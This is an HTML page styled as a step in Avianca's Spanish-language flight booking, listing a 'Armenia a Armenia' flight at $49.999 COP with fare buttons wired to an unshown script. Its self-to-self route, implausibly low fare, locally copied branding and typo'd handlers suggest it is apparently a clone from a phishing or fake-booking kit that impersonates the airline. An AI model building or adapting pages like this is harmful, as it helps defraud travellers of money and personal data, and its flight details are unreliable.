<html lang="en"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="media/icon.ico">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
    <link rel="stylesheet" href="./css/style.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script> <!-- Cargar jQuery -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">

    <title>Avianca | #NACIONALES</title>
</head>

<body __processed_223ba739-fa91-4975-b076-d1d3b0b71523__="true">

    

    <div class="header_check">
        <img src="media/logo-avianca-minimal.svg" class="logo">
        <img src="media/paso1.png" alt="" class="pasos">
    </div>
    <div class="body_check">
                    <div class="row_hd">
                <div class="text_hd">
                    <p>Vuelo de ida - </p>
                    <h4>Armenia a Armenia </h4>
                </div>
                <div class="btn_edit">
                    <button type="button" onclick="regrear();">
                        <img src="media/editar.png" alt=""></button>
                </div>
            </div>

            <div class="info_vuelo">
                <p class="directo">Directo | 1h 34m</p>
                <div class="row_horario">
                    <p>08:05</p>
                    <div class="lineSeparatorHours"></div>
                    <p>09:39</p>
                </div>

                <div class="row_detalle">
                    <div class="info">
                        <img src="media/icon_i.png" alt="">
                        <p>Detalles de vuelo:</p>
                    </div>
                    <div class="precio">
                        $49.999 COP
                    </div>
                </div>
                <div class="i_vuelo">
                    <img src="media/info_vuelo.png" alt="">
                </div>
            </div>

            <img src="media/sin_sorpresas.png" alt="" class="sin_sorpresas" id="sin_sorpresas">

            <div class="row_hd">
                <div class="text_hd">
                    <p>Selecciona tu vuelo de llegada - </p>
                    <h4> Armenia a Armenia </h4>
                </div>
                <div class="btn_edit">
                    <button type="button" onclick="editarVuelo(49999);">
                        <img src="media/editar.png" alt=""></button>
                </div>
            </div>

            <div class="info_vuelo" id="vueloLlegada">
                <p class="directo">Directo | 1h 34m</p>
                <div class="row_horario">
                    <p id="horaA"></p>
                    <div class="lineSeparatorHours"></div>
                    <p id="horaB"></p>
                </div>

                <div class="row_detalle">
                    <div class="info">
                        <img src="media/icon_i.png" alt="">
                        <p>Detalles de vuelo:</p>
                    </div>
                    <div class="precio" id="precio">

                    </div>
                </div>
                <div class="i_vuelo">
                    <img src="media/info_vuelo.png" alt="">
                </div>
            </div>

            <div class="precios" id="precios">
                <img src="media/precio1.png" alt="" onclick="getTarifa('AXM 08:05 - 09:39 AXM', '', 1, 'rango');">

                <img src="media/precio2.png" alt="" onclick="getTarifa('AXM 09:50 - 11:24 AXM', '', 2, 'rango');">

                <img src="media/precio3.png" alt="" onclick="getTarifa('AXM 15:45 - 17:19 AXM', '', 3, 'rango');">

                <img src="media/precio4.png" alt="" onclick="getTarifa('AXM 18:30 - 20:04 AXM', '', 4, 'rango');">
            </div>

            <div class="total_r">
                <div class="txt_">
                    <p>Total de tu reserva:</p>
                    <p class="precio" id="precioTotal">$49.999 COP</p>
                </div>

                <button type="button" disabled="" id="continuar" onclick="continuarViaje();">Continúa personalizando tu viaje</button>
            </div>

            <div class="textFooterBook">
                © Avianca S.A 2023
            </div>
            </div>



<div class="modal modal-container" id="modal_tarifa">
    <div class="content-modal content-modal-np">
        <div class="content_booking">
            <div class="headerPickF headerPickF2">
                <div class="row_txt_">
                    <button type="button" onclick="closeModalTarifa();"><img src="media/regresar.png" alt=""></button>
                    <p>Selecciona tu tarifa</p>
                </div>

                <div class="row_info_">
                    <p id="tarifaText1"><strong> AXM 08:05 - 09:39 BAQ </strong></p>
                    <p id="tarifaText2"> Lun, Nov 28 </p>
                </div>
            </div>

            <div class="container-tabs-cabin">
                <p>Económica</p>
            </div>

            <div class="precios_tarifa" id="precios_tarifa">

            </div>

        </div>
    </div>
</div>

<script src="js/jquery-3.7.1.min.js"></script>
<script src="js/check1.js"></script>
<div class="loader_inicial" id="loaderI" style="display: none;">
    <img src="media/loading.png" alt="">
    <div class="lds-ring">
        <div></div>
        <div></div>
        <div></div>
        <div></div>
    </div>
</div>

<script>
    setTimeout(function() {
        $('#loaderI').hide();
    }, 3000);
</script>

</body></html>